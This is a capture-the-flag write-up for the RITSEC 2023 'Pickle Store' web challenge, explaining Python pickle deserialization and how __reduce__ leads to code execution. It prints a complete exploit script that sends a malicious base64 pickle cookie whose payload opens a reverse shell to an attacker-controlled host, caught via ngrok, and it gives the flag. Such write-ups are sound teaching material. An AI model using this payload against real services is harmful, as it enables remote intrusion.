# Pickle Store (RITSEC 2023 - Web)

**Challenge description**: "New pickles just dropped! Check out the store."<br>
**Challenge date**: ven, 31 Mar. 2023, 16:00 UTC — dom, 02 Apr. 2023, 16:00 UTC<br>
**Challenge points**: 223<br>

## Involved Vulnerability

The server of this challenge uses the Python module called *pickle*, which is used for serializing (“*Pickling*”) and deserializing (“*Unpickling*”) Python objects' structure (see [[1]](#1)). This module is vulnerable to RCE during unpickling of class instances (objects). Classes can be defined to contain methods that can be called during the unpickling process to specify how they should be unpickled. One of these methods is *\_\_reduce()\_\_*.<br>
As evidenced by [[1]](#1):<br>

>The \_\_reduce\_\_() method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “reduce value”).<br>
If a string is returned, the string should be interpreted as the name of a global variable. \[...\]<br>
When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order:<br> - A **callable object** that will be called to create the initial version of the object.<br> - A **tuple of arguments** for the callable object. An empty tuple must be given if the callable does not accept any argument.<br> - \[...\]

A Python function is a callable object. So, if the attacker defines a class like the one below, pickles its instance and send the pickled object to the server, this will execute the specified function with the parameters given in the tuple.
```python
class RCE:
    def __reduce__(self):
        return (function_name, (parameter_1,parameter_2,)) #if there is only 1 parameter: (parameter_1,)
```
## Exploring the challenge
This is the first thing the user see as soon as he/she accesses the challenge:

![Pickle Store](https://user-images.githubusercontent.com/66698256/229376712-d235bbbb-0d59-4c3d-a9e0-ab0829107127.png)

If the user clicks on one of the buttons (the first one, for example), he/she will be redirected to <code>/order</code>:

![Order executed](https://user-images.githubusercontent.com/66698256/229377403-7b7e14fd-62dd-46fd-9b15-5188b734f11d.png)

Clicking on the "New Order" button the user will be redirected to the initial page. By inspecting the four buttons something interesting can be noticed:

![Cookie setting](https://user-images.githubusercontent.com/66698256/229377514-b38166dd-aa58-412f-866b-9b865f722abc.png)

When a button is clicked, a cookie called "*order*" is set to a string containing a pickled object and sent to the server through a GET request to <code>/order</code>. Here the pickled object is presumably read from the cookie, decoded, unpickled and ultimately printed into the returned page (if a string). Thanks to this cookie the server knows which article (or pickle) the user has chosen to buy.<br>
If we take the cookie value defined in the event handler of the "Sweet Pickle" button, decode it and unpickle it, we'll understand better how all this works.

![Unpickling](https://user-images.githubusercontent.com/66698256/229381958-d871524b-304f-4e3b-932b-790bd8eba284.png)

As expected, the object obtained ("*sweetpickle*") is a string and it's the same visualized in the <code>/order</code> page.<br>
Thus the user can pickle any object (not only strings), encode it in base64 and set the "*order*" cookie accordingly. The pickled object will be decoded, unpickled and, if a string, printed on the <code>/order</code> page.

![Pickling](https://user-images.githubusercontent.com/66698256/229382473-c062a8e3-a07e-4b39-8ee6-72cf397041aa.png)

![Set forged cookie](https://user-images.githubusercontent.com/66698256/229382220-2c6b25ef-d00e-4681-8267-fa8c751e4892.png)

![AAAA](https://user-images.githubusercontent.com/66698256/229378762-be51dd0c-33b0-40c2-abcf-c1b41e340fde.png)


## Attack

The behaviour to be exploited is the insecure unpickling (or insecure deserialization) of particular pickled objects. What the application does with the output of the deserialization is of no interest to the attacker. A way to exploit the involved vulnerability is to spawn a reverse shell on the server through Python code. The *\_\_reduce\_\_()* method should be defined like this:

```python
host="IP_Address"   #or "Domain_Name"
port="PORT"
class RCE:
    def __reduce__(self):
        #code here will be executed only during pickling, not unpickling (only the return statement will be coded in pickle format).
        return (exec, ('from os import dup2;from subprocess import run; import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("'+host+'",'+port+')); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2); run(["/bin/bash","-i"]);',))
```
Variables <code>host</code> and <code>port</code> contain, respectively, the IP address (or domain name) and the port on which the attacker will listen for the spawned reverse shell. 
The complete exploit is the following:
```python
import pickle
import base64
import requests
import socket

host="IP_Address"   #or "Domain_Name"
port="PORT"

class RCE:
    def __reduce__(self):
        #code here will be executed only during pickling, not unpickling (only the return statement will be coded in the pickled object).
        return (exec, ('from os import dup2;from subprocess import run; import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("'+host+'",'+port+')); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2); run(["/bin/bash","-i"]);',))

pickled_bytes=pickle.dumps(RCE())    #Object instance ---> Pickle format (bytes)
pickled_base64_bytes = base64.b64encode(pickled_bytes)    #Pickle format (bytes) ---> Base64 encoding (bytes)
pickled_base64_string = pickled_base64_bytes.decode('ascii')   #Base64 encoding (bytes) ---> Base64 encoding (string)
response=requests.get("https://pickles-web.challenges.ctf.ritsec.club/order",cookies={"order":pickled_base64_string})
print(response.text)
```
In order to execute a reverse shell a service like *ngrok* can be used. In this example I will listen on port <code>9001</code> of my own machine, but, for the server, I will listen on port <code>19945</code> at <code>4.tcp.eu.ngrok.io</code> (*ngrok* will redirect traffic on its port to mine). So:

![Listening_Reverse_Shell](https://user-images.githubusercontent.com/66698256/229460262-ab932d54-cd3b-4129-8e6a-0414c33c22e6.png)

Then I'll execute the exploit:

![Exploit](https://user-images.githubusercontent.com/66698256/229460307-60e25c2c-305a-493c-a2e4-e2c2553d8721.png)

![Spawned_Reverse_Shell](https://user-images.githubusercontent.com/66698256/229456613-76d66a6c-1468-4e23-8626-c1c79855f29c.png)

Reverse shell spawned! The flag is inside <code>/flag</code>.

![Flag](https://user-images.githubusercontent.com/66698256/229458939-a3ca621a-0721-4edf-8ae2-a1709a4c9edd.png)

Flag is <code>RS{TH3_L345T_53CUR3_P1CKL3}</code>.




## References
<a id="1">[1]</a> 
https://docs.python.org/3/library/pickle.html


